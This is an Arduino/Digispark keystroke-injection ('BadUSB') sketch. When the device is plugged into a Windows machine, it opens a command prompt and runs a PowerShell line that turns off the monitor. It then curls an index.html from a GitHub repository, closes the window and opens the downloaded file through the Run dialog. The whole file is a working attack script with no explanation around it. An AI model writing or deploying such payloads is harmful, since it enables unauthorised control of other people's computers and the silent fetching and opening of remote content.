#include "DigiKeyboard.h"
//#include "DigiKeyboardDe.h" //for De Layout and "DigiKeyboardDe" instead of "DigiKeyboard"

void setup() {

}
void loop() {
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell (Add-Type '[DllImport(\\");
  DigiKeyboard.print("\"user32.dll\\");
  DigiKeyboard.print("\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)");
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("curl https://raw.githubusercontent.com/Isht4r/darling_roll/5859d22e3f484cb14cb9b9a3465bb0d1a042c569/index.html -O index.html");
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2200);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(2200);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(80);
  
  DigiKeyboard.print("index.html");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for(;;){ /*empty*/ }
}
